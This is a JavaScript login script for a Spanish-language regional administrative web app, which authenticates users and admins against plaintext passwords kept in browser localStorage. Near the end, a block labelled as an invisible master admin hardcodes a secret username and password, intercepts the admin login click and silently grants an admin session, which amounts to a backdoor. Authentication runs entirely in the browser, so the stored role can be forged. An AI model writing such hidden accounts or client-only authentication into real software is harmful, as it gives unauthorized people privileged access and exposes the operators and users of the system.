// ========= Util POST JSON (si más adelante usas API) =========
async function postJSON(url, data) {
  const res = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type':'application/json' },
    body: JSON.stringify(data),
    credentials: 'include'
  });
  if (!res.ok) throw new Error(`HTTP ${res.status}`);
  return res.json();
}

// ========= Constantes de almacenamiento =========
const SESSION_KEY      = 'session_user';                 // sessionStorage
const USERS_KEY        = 'datos_administrativos_v1';     // usuarios normales
const ADMINS_KEY       = 'usuarios_admin_v1';            // usuarios admin
const LAST_LOGOUT_KEY  = 'last_logout';

// ========= Helpers =========
const $  = (s, c=document) => c.querySelector(s);
const $$ = (s, c=document) => Array.from(c.querySelectorAll(s));

function readArray(key) {
  try {
    const raw = localStorage.getItem(key);
    const arr = raw ? JSON.parse(raw) : null;
    return Array.isArray(arr) ? arr : [];
  } catch { return []; }
}
function saveSession(obj) {
  sessionStorage.setItem(SESSION_KEY, JSON.stringify(obj));
}

// ========= Trampa básica de “atrás” en la pantalla de login =========
(function antiBackOnLogin() {
  // Si volvieron aquí con back-forward cache, limpiamos cualquier sesión residual
  window.addEventListener('pageshow', (e) => {
    if (e.persisted) {
      try { sessionStorage.removeItem(SESSION_KEY); } catch {}
    }
  });

  // Empuja un estado extra y anula retroceso inmediato (en algunos navegadores)
  try {
    history.replaceState({ login: true }, "", location.href);
    history.pushState({ blocker: true }, "", location.href);
    window.addEventListener('popstate', function () {
      // Siempre empujamos hacia adelante en login para que no vaya a páginas internas
      history.pushState({ blocker: true }, "", location.href);
    });
  } catch {}
})();

// ========= Login normal =========
const btnLogin  = document.getElementById('btnLogin');
const userInput = document.getElementById('userInput');
const passInput = document.getElementById('passInput');

btnLogin?.addEventListener('click', async () => {
  const username = (userInput.value || "").trim();
  const password = passInput.value || "";

  if (!username || !password) {
    alert('Ingresa tu usuario y contraseña.');
    return;
  }

  btnLogin.disabled = true;
  btnLogin.textContent = 'Verificando...';

  try {
    // Leer usuarios normales desde Datos Administrativos
    const usuarios = readArray(USERS_KEY);
    const match = usuarios.find(u =>
      (u?.usuario || "").trim().toLowerCase() === username.toLowerCase() &&
      (u?.contrasena || u?.contraseña || "") === password
    );

    if (match) {
      saveSession({
        username: match.usuario,
        nombre: match.nombre || "",
        role: 'user',
        ts: Date.now()
      });
      // limpiar marca de logout (opcional)
      try { localStorage.removeItem(LAST_LOGOUT_KEY); } catch {}
      location.href = 'pagina_principal_regional.html';
    } else {
      alert('Usuario o contraseña incorrectos.');
    }
  } catch (e) {
    console.error(e);
    alert('Error de conexión. Intenta más tarde.');
  } finally {
    btnLogin.disabled = false;
    btnLogin.textContent = 'Acceso';
  }
});

// ========= Modal admin =========
const adminModal     = document.getElementById('adminModal');
const btnAdminOpen   = document.getElementById('btnAdminOpen');
const btnAdminCancel = document.getElementById('btnAdminCancel');
const btnAdminLogin  = document.getElementById('btnAdminLogin');
const adminUser      = document.getElementById('adminUser');
const adminPass      = document.getElementById('adminPass');
const adminMsg       = document.getElementById('adminMsg');

function openModal() {
  adminMsg.textContent = '';
  adminUser.value = '';
  adminPass.value = '';
  adminModal.style.display = 'flex';
  document.body.classList.add('modal-open');
  setTimeout(() => adminUser.focus(), 40);
}
function closeModal() {
  adminModal.style.display = 'none';
  document.body.classList.remove('modal-open');
}
btnAdminOpen?.addEventListener('click', openModal);
btnAdminCancel?.addEventListener('click', closeModal);

// Cerrar modal al hacer click fuera
adminModal?.addEventListener('click', (e) => {
  if (e.target === adminModal) closeModal();
});
// Cerrar con Escape
document.addEventListener('keydown', (e) => {
  if (e.key === 'Escape' && adminModal?.style.display === 'flex') closeModal();
});

// Enviar login admin
btnAdminLogin?.addEventListener('click', async () => {
  const username = (adminUser.value || "").trim();
  const password = adminPass.value || "";
  if (!username || !password) {
    adminMsg.textContent = 'Completa usuario y contraseña.';
    return;
  }

  btnAdminLogin.disabled = true;
  btnAdminLogin.textContent = 'Verificando...';
  adminMsg.textContent = '';

  try {
    const admins = readArray(ADMINS_KEY);
    const match = admins.find(u =>
      (u?.usuario || "").trim().toLowerCase() === username.toLowerCase() &&
      (u?.contrasena || u?.contraseña || "") === password
    );

    if (match) {
      saveSession({
        username: match.usuario,
        nombre: match.nombre || "",
        role: 'admin',
        ts: Date.now()
      });
      try { localStorage.removeItem(LAST_LOGOUT_KEY); } catch {}
      location.href = 'pagina_principal_regional_administradores.html';
    } else {
      adminMsg.textContent = 'No autorizado.';
    }
  } catch (e) {
    console.error(e);
    adminMsg.textContent = 'Error de conexión.';
  } finally {
    btnAdminLogin.disabled = false;
    btnAdminLogin.textContent = 'Acceder';
  }
});

// Enter para enviar en modal
[adminUser, adminPass].forEach(el => {
  el?.addEventListener('keydown', (e) => {
    if (e.key === 'Enter') btnAdminLogin.click();
  });
});

/* ==== Admin maestro invisible (sin modificar funciones existentes) ==== */
(() => {
  const SUPER_USER = "Administrador";
  const SUPER_PASS = "Adm¡n¡str@d0r";

  // Reutilizamos helpers y constantes ya declarados en tu archivo:
  // saveSession, LAST_LOGOUT_KEY, btnAdminLogin, adminUser, adminPass

  function loginAsSuperAdmin() {
    try {
      saveSession({
        username: SUPER_USER,
        nombre: SUPER_USER,
        role: 'admin',
        ts: Date.now()
      });
      try { localStorage.removeItem(LAST_LOGOUT_KEY); } catch {}
      // Redirige a la home de administradores
      location.href = 'pagina_principal_regional_administradores.html';
    } catch (err) {
      console.error(err);
      alert('Error iniciando sesión de administrador.');
    }
  }

  // Intercepta el click del botón del modal en fase de captura
  if (btnAdminLogin && adminUser && adminPass) {
    btnAdminLogin.addEventListener('click', (e) => {
      const u = (adminUser.value || '').trim();
      const p = adminPass.value || '';
      if (u.toLowerCase() === SUPER_USER.toLowerCase() && p === SUPER_PASS) {
        // Detiene cualquier otro listener (incluido el original) para este click
        e.stopImmediatePropagation?.();
        e.preventDefault?.();
        loginAsSuperAdmin();
      }
      // Si no coincide, dejamos que siga el flujo normal
    }, true); // <-- CAPTURA
  }
})();

// === Toggle mostrar/ocultar contraseña (estado inicial corregido) ===
(function () {
  function initToggle(btn) {
    if (!btn || btn.dataset.bound === "1") return;
    btn.dataset.bound = "1";

    const targetId = btn.getAttribute('data-target');
    const input = document.getElementById(targetId);
    if (!input) return;

    // Estado inicial: oculto (password) => aria-pressed="false"
    input.type = 'password';
    btn.setAttribute('aria-pressed', 'false');

    btn.addEventListener('click', () => {
      const visible = input.type === 'text';
      if (visible) {
        input.type = 'password';
        btn.setAttribute('aria-pressed', 'false'); // muestra icono cerrado
      } else {
        input.type = 'text';
        btn.setAttribute('aria-pressed', 'true');  // muestra icono abierto
      }
    });
  }

  function attachAll() {
    document.querySelectorAll('[data-toggle="password"]').forEach(initToggle);
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', attachAll);
  } else {
    attachAll();
  }
})();
